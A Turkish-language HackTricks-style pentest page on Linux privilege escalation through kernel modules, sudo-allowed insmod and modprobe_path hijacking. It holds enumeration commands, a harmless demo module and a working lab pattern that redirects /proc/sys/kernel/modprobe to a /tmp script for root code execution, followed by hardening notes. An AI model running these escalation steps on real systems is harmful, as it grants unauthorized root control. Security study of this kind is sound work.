# Kernel Modules ve modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module ve module-loading yanlış yapılandırmaları

Kernel module desteği, Linux privilege escalation incelemesi sırasında yüksek etkili bir alandır. Her unsigned-module mesajını tek başına exploitable kabul etmeyin; bunun yerine şu pratik sorulara yanıt bulmak için kullanın:

- Mevcut user `sudo`, capabilities veya writable bir helper path üzerinden module load edebiliyor mu?
- Module loading hâlâ enabled mı?
- Module signature enforcement disabled mı?
- Module directory'leri veya module file'ları writable mı?
- Ne olduğunu doğrulamak için kernel log'ları okunabiliyor mu?

Hızlı triage:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Yorum:

- `modules_disabled=1`, yeniden başlatılana kadar yeni modüllerin yüklenemeyeceği anlamına gelir.
- `module_sig_enforce=1`, genellikle imzasız modülleri engeller.
- `dmesg_restrict=0`, birçok sistemde ayrıcalıksız kullanıcıların kernel loglarını okumasına izin verir.
- `/lib/modules/$(uname -r)/` altındaki yazılabilir yollar tehlikelidir; çünkü module discovery ve auto-loading bu ağaca güvenebilir.

### Bir modül yükleme ve kernel çıktısını okuma

Yerel bir modül yüklemek için meşru izniniz varsa `insmod`, sağladığınız tam `.ko` dosyasını ekler. Modülün init function'ı hemen çalışır ve `printk()` ile yazılan mesajlar kernel loglarında görünür.

İnceleme veya lab ortamları için minimal iş akışı:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
`sudo -l` `insmod`, `modprobe` veya bunların etrafındaki bir wrapper'a izin veriyorsa bunu kritik olarak değerlendirin:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo tarafından izin verilen `insmod`

Bir kullanıcının `insmod` çalıştırmasına izin veren bir sudo kuralı, normal bir yönetim yardımcısının çalıştırılmasına izin vermekle kıyaslanamaz. Modülün başlatma kodu `.ko` eklenir eklenmez kernel bağlamında çalışır; bu nedenle pratik inceleme sorusu şudur: "Bu kullanıcı yüklenecek modülü seçebilir veya değiştirebilir mi?"

Genel inceleme akışı:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Kullanıcı rastgele bir `.ko` sağlayabiliyorsa, yetkili bir assessment kapsamında bu kural tam sistem compromise olarak değerlendirilmelidir. Daha güvenli bir operasyonel yaklaşım, modül yükleme yetkisini sudo üzerinden devretmekten kaçınmaktır; kaçınılmazsa tam yolu, sahipliği, izinleri, imzalama politikasını ve kaldırma iş akışını kısıtlayın.

Kontrollü bir lab ortamında zararsız bir modül oluşturma pattern'i için minimal kaynak kodu ve Makefile şu şekilde görünür:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Yalnızca yetkili bir laboratuvarda derleyin ve yükleyin:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` kötüye kullanım kontrolleri

`kernel.modprobe`, kernel'in modül yükleme desteğine ihtiyaç duyduğunda çağırdığı userspace helper'ı kontrol eder. Bir attacker bunu yazılabilir bir executable path'i gösterecek şekilde değiştirebilir ve bilinmeyen bir binary formatı ya da başka bir modül isteği yolunu tetikleyebilirse, bu root code execution'a dönüşebilir.

Mevcut helper'ı kontrol edin:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Bunu etkileyip etkileyemeyeceğinizi kontrol edin:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Genel, yalnızca laboratuvar ortamına yönelik kalıp:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Güçlendirilmiş sistemlerde bu işlem başarısız olmalıdır; çünkü ayrıcalıksız kullanıcılar `kernel.modprobe` üzerine yazamaz, helper path yazılabilir değildir veya module-loading path'leri engellenmiştir.

### Yazılabilir `/lib/modules` incelemesi

Yazılabilir module dizinleri, `modprobe`'un daha sonra nasıl çağrıldığına bağlı olarak module replacement, malicious module planting veya auto-load abuse işlemlerine olanak sağlayabilir.

Yazılabilir konumları inceleyin:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Yazılabilir modül içeriği bulursanız, modüllerin nasıl keşfedildiğini kontrol edin:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Savunma notları:

- `/lib/modules` dizininin sahibi `root:root` olmasını ve kullanıcılar tarafından yazılamamasını sağlayın.
- Operasyonel olarak mümkün olduğunda, önyüklemeden sonra `kernel.modules_disabled=1` değerini ayarlayın.
- Yüklenebilir modüllere ihtiyaç duyan sistemlerde module signing uygulayın.
- `/proc/sys/kernel/modprobe`, `/lib/modules` üzerindeki yazma işlemlerini ve beklenmeyen `insmod`/`modprobe` çalıştırmalarını izleyin.
